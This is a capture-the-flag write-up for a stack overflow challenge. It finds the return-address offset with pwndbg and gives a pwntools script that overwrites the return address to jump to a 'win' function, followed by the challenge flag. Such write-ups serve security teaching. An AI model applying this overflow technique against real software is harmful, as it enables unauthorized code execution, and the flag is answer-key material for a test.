# wetuwn addwess

## Challenge

Hijack the retaddr using a stack overflow.

## Walkthrough

```gdb
pwndbg> br *0x00000000004012ab
Breakpoint 1 at 0x4012ab
pwndbg> r
...
─────────────────────────────────────────[ STACK ]─────────────────────────────────────────
00:0000│ rsp 0x7fffffffdcc0 —▸ 0x7ffff7fe4530 (_dl_fini) ◂— push   rbp
01:0008│     0x7fffffffdcc8 ◂— 0x0
02:0010│     0x7fffffffdcd0 —▸ 0x401300 (__libc_csu_init) ◂— endbr64
03:0018│     0x7fffffffdcd8 —▸ 0x401130 (_start) ◂— endbr64
04:0020│     0x7fffffffdce0 —▸ 0x7fffffffddd0 ◂— 0x1
05:0028│     0x7fffffffdce8 —▸ 0x405260 ◂— 0xfbad2488
06:0030│ rbp 0x7fffffffdcf0 —▸ 0x401300 (__libc_csu_init) ◂— endbr64
07:0038│     0x7fffffffdcf8 —▸ 0x7ffff7e2409b (__libc_start_main+235) ◂— mov    edi, eax
...
pwndbg> info address win
Symbol "win" is at 0x401216 in a file compiled without debugging.
```

Looks like the retaddr is at `+0x38` and we need to redirect it to `0x000000401216`

```py
from pwn import *

r = remote('wetuwn-addwess.ctf.maplebacon.org', 32014)
r.setLevel('DEBUG')

r.recvuntil("What's your name?")
r.sendline('A' * 0x38 + '\x16\x12\x40\x00\x00\x00')
r.recvlines(3)
```

## Solve

`maple{r3turn_t0_w1n}`
